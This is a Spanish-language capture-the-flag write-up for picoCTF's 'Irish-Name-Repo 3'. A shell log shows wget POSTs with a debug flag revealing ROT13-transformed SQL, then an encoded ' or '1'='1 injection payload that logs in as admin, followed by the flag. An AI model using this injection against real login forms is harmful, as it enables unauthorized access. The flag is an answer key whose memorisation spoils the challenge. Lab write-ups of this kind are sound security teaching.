# Irish-Name-Repo 3

## Descripcion
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
## Pistas
- Seems like the password is encrypted.
## Solucion
```
nagubi-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/29132/login.php --post-data="debug=1&password=' or '1'='1"
--2023-03-14 14:50:45--  https://jupiter.challenges.picoctf.org/problem/29132/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 500 Internal Server Error
2023-03-14 14:50:45 ERROR 500: Internal Server Error.

nagubi-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/29132/login.php --post-data="debug=1&password=abc"
--2023-03-14 14:51:13--  https://jupiter.challenges.picoctf.org/problem/29132/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php'

login.php               [ <=>               ]     101  --.-KB/s    in 0s      

2023-03-14 14:51:13 (25.3 MB/s) - 'login.php' saved [101]

nagubi-picoctf@webshell:~$ cat login.php
<pre>password: abc
SQL query: SELECT * FROM admin where password = 'nop'
</pre><h1>Login failed.</h1>nagubi-picoctf@webshell:~$ wget https://jupiter.cha29132/login.php --post-data="debug=1&password=abcdefghijk"
--2023-03-14 14:52:58--  https://jupiter.challenges.picoctf.org/problem/29132/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.1'

login.php.1             [ <=>               ]     117  --.-KB/s    in 0s      

2023-03-14 14:52:58 (40.5 MB/s) - 'login.php.1' saved [117]

nagubi-picoctf@webshell:~$ cat login.php.1
<pre>password: abcdefghijk
SQL query: SELECT * FROM admin where password = 'nopqrstuvwx'
nagubi-picoctf@webshell:~$ wget https://jupiter.challenges.picoctf.org/problem/29132/login.php --post-data="debug=1&password=a'be'1'='1"
--2023-03-14 14:55:54--  https://jupiter.challenges.picoctf.org/problem/29132/login.php
Resolving jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Connecting to jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)|3.131.60.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'login.php.2'

login.php.2             [ <=>               ]     164  --.-KB/s    in 0s      

2023-03-14 14:55:54 (68.9 MB/s) - 'login.php.2' saved [164]

nagubi-picoctf@webshell:~$ cat login.php.2
<pre>password: a'be'1'='1
SQL query: SELECT * FROM admin where password = 'n'or'1'='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>nagubi-picoctf@webshell:~$

```

## Bandera

picoCTF{3v3n_m0r3_SQL_06a9db19}

## Notas adicionales

## Referencias
[SQL injection on OWASP](https://owasp.org/www-community/attacks/SQL_Injection)